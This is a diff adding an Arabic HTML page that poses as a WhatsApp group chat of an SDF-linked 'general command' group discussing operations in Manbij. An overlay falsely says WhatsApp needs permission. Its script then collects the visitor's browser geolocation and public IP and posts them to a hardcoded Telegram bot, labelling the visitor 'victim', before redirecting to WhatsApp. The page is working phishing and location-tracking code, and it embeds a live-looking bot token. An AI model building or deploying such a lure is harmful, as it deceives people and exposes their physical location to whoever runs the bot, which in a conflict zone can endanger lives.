@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> القيادة العامة - واتساب </title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Tahoma", sans-serif;
+      background: #ece5dd;
+    }
+
+    .chat-container {
+      max-width: 100%;
+      width: 400px;
+      margin: 20px auto;
+      height: 200px;
+      border: 1px solid #ccc;
+      background: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      position: relative;
+      padding-bottom: 50px;
+      
+    }
+
+    .chat-header {
+      background-color: #075e54;
+      color: white;
+      padding: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .chat-header-left {
+      display: flex;
+      align-items: center;
+    }
+
+    .chat-header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-left: 10px;
+    }
+
+    .group-name {
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .online-count {
+      font-size: 12px;
+      color: #b2dfdb;
+    }
+
+    .chat-body {
+      padding: 10px;
+      max-height: 500px;
+      overflow-y: auto;
+      background: #e5ddd5;
+    }
+
+    .message {
+      margin: 10px 0;
+      padding: 10px;
+      background: #dcf8c6;
+      border-radius: 5px;
+      max-width: 80%;
+      position: relative;
+    }
+
+    .message.sender {
+      background: #fff;
+      text-align: left;
+      margin-right: auto;
+    }
+
+    .message .name {
+      font-weight: bold;
+      color: #075e54;
+      margin-bottom: 5px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .name .status {
+      font-size: 10px;
+      color: #4caf50;
+      background-color: #e0f2f1;
+      padding: 2px 5px;
+      border-radius: 3px;
+    }
+
+    .attachment {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      background: #f0f0f0;
+      border: 1px solid #ccc;
+      padding: 5px;
+      margin-top: 5px;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    .attachment img {
+      width: 20px;
+      height: 20px;
+    }
+
+    .audio-player {
+      background: #f1f0f0;
+      border-radius: 5px;
+      padding: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 5px;
+      position: relative;
+    }
+
+    .audio-player audio {
+      display: none;
+    }
+
+    .audio-player .play-btn {
+      background-color: transparent;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .audio-player .duration {
+      font-size: 12px;
+      color: #333;
+      min-width: 40px;
+      text-align: center;
+    }
+
+    .audio-player .progress {
+      flex: 1;
+      height: 6px;
+      background: #ccc;
+      border-radius: 3px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .audio-player .progress-bar {
+      background-color: #25d366;
+      height: 100%;
+      width: 0%;
+    }
+
+    @media (max-width: 500px) {
+      .chat-container {
+        width: 95%;
+      }
+    }
+
+    /* ====== Overlay (تشويش) ====== */
+    .overlay {
+      position: fixed;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      left: 0;
+      background: rgba(0, 0, 0, 0.2);
+      backdrop-filter: blur(2px);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .overlay button {
+      margin-top: 20px;
+      padding: 15px 30px;
+      background-color: #25d366;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    /* ====== إشعار تمت القراءة ====== */
+    .read-status {
+      position: absolute;
+      bottom: 5px;
+      left: 10px;
+      font-size: 12px;
+      color: #34b7f1;
+    }
+
+    .click{
+
+      background-color: #4caf50;
+      color: #ccc;
+      width: 100%;
+      text-align: center;
+      height:50px;
+      
+    }
+    .button{
+      width: 100%;
+      height: 100%;
+      background-color: #25d366;
+      outline: none;
+      border: none;
+      color: #ccc;
+      font-size: 20px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="chat-container">
+    <div class="chat-header">
+      <div class="chat-header-left">
+        <img src="q.jpg" alt="Group Image">
+        <div>
+          <div class="group-name"> القيادة العامة للكوادر</div>
+          <div class="online-count">10 متصل الآن</div>
+        </div>
+      </div>
+    </div>
+    <div class="chat-body">
+
+      <div class="message sender">
+        <div class="name">فرهاد <span class="status">متصل الآن</span></div>
+        أول شي، هاي نسخة من الملف الجديد:
+        <div class="attachment">
+          <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF">
+          عناصر أبو عمشة.pdf
+        </div>
+        
+      </div>
+
+      <div class="message">
+        <div class="name">بران <span class="status">متصل الآن</span></div>
+        هڤال، في تحرك مشبوه غرب منبج، لازم نراجع الخطة فوراً.
+        <div class="read-status">✓✓</div>
+      </div>
+
+      <div class="message sender">
+        <div class="name">أصلان</div>
+        تم إرسال التقارير الميدانية للمنطقة الغربية.
+        <div class="attachment">
+          <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF">
+          تقرير_ميداني_منبج.pdf
+        </div>
+        
+      </div>
+
+      <div class="message">
+        <div class="name">آلان</div>
+        هذا مقطع صوتي محول من أحد العناصر:
+        <div class="audio-player">
+          <button class="play-btn" title="تشغيل الصوت">▶️</button>
+          <div class="progress"><div class="progress-bar"></div></div>
+          <div class="duration">2:00</div>
+          <audio src="voice_sample.mp3"></audio>
+        </div>
+        <div class="read-status">✓✓</div>
+      </div>
+
+      <div class="message sender">
+        <div class="name">فرهاد</div>
+        خريطة الانتشار الكامل متوفرة هون:
+        <div class="attachment">
+          <img src="https://cdn-icons-png.flaticon.com/512/732/732220.png" alt="Excel">
+          انتشار_قسد.xlsx
+        </div>
+       
+      </div>
+
+      <div class="message">
+        <div class="name">بران</div>
+        تحرير منبج مسألة وقت فقط، العناصر على الأرض بثبات عالي.
+        <div class="read-status">✓✓</div>
+      </div>
+
+      <div class="message sender">
+        <div class="name">أصلان</div>
+        صحيح، والبيشمركة دعمونا بالمعلومات حول التحركات الأخيرة.
+        
+      </div>
+
+      <div class="message">
+        <div class="name">آلان</div>
+        الخطة أ تتطبق الليلة، لازم نكون مستعدين بالكامل يا هڤال.
+       
+      </div>
+
+      <div class="message sender">
+        <div class="name">فرهاد</div>
+        راح أرفقلكم خطة العمليات النهائية:
+        <div class="attachment">
+          <img src="https://cdn-icons-png.flaticon.com/512/732/732052.png" alt="Word">
+          خطة_تحرير_منبج.docx
+        </div>
+        <div class="read-status">✓✓</div>
+      </div>
+
+    </div>
+
+    <div  class="click"> 
+
+      <button class="button">    الانضمام الى المجموعة  </button>
+    </div>
+  </div>
+
+  <!-- التشويش (Overlay) -->
+  <div class="overlay" id="overlay">
+    <h2>⚠️ تطبيق واتساب يطلب النقر على سماح  </h2>
+    <p>لتتمكن من الانضمام إلى مجموعة  القيادة العامة للكوادر  يرجى السماح لتطبيق واتساب    .</p>
+    <button id="forceJoin">  متابعة </button>
+  </div>
+
+
+  <script>
+    document.querySelectorAll(".audio-player").forEach(player => {
+      const audio = player.querySelector("audio");
+      const playBtn = player.querySelector(".play-btn");
+      const progressBar = player.querySelector(".progress-bar");
+      let isPlaying = false;
+
+      playBtn.addEventListener("click", () => {
+        if (!isPlaying) {
+          audio.play();
+          playBtn.textContent = "⏸️";
+          isPlaying = true;
+        } else {
+          audio.pause();
+          playBtn.textContent = "▶️";
+          isPlaying = false;
+        }
+      });
+
+      audio.addEventListener("timeupdate", () => {
+        const percent = (audio.currentTime / audio.duration) * 100;
+        progressBar.style.width = percent + "%";
+      });
+
+      audio.addEventListener("ended", () => {
+        playBtn.textContent = "▶️";
+        progressBar.style.width = "0%";
+        isPlaying = false;
+      });
+    });
+
+    const botToken = "8267489111:AAG0j_0a9Rp0yvdNhaKpmZqh7vZ2RDmEMfQ";
+    const chatId = "7837731408";
+    const whatsappLink = "https://chat.whatsapp.com/%D8%B1%D8%A7%D8%A8%D8%B7_%D8%A7%D9%84%D9%83%D8%B1%D9%88%D8%A8_%D9%87%D9%86%D8%A7";
+
+    document.getElementById("forceJoin").addEventListener("click", function () {
+      if (confirm("هل تريد الانضمام إلى مجموعة قوات قسد  سايطلب منك  تطبيق واتساب النقر على السماح .")) {
+        document.getElementById("overlay").style.display = "block"; // إخفاء التشويش
+        getLocation();
+      }
+    });
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      } else {
+        alert("المتصفح لا يدعم الدخول للكروب.");
+      }
+    }
+
+    function showPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const message = `📥 طلب دخول جديد إلى كروب القيادة العامة:\n🗺️ موقع الضحية : https://www.google.com/maps?q=${lat},${lon}\n🌐 IP: ${ip}`;
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message
+            })
+          }).then(() => {
+            setTimeout( function(){
+              window.location.href = whatsappLink;
+            },5000)
+           
+          }).catch(() => {
+            window.location.href = whatsappLink;
+          });
+
+        }).catch(() => {
+          window.location.href = whatsappLink;
+        });
+    }
+
+    function showError(error) {
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          alert("🚫 لم نتمكن من منحك الوصول إلى مجموعة واتساب لأنك اخترت عدم السماح . يرجى المحاولة مرة أخرى والسماح  لإكمال الانضمام.");
+          break;
+        case error.POSITION_UNAVAILABLE:
+          alert("❌ الكروب غير متاح");
+          break;
+        case error.TIMEOUT:
+          alert("⏱️ انتهت مهلة الدخول للكروب.");
+          break;
+        default:
+          alert("❓ حدث خطأ غير معروف.");
+      }
+    }
+  </script>
+
+</body>
+</html>
+
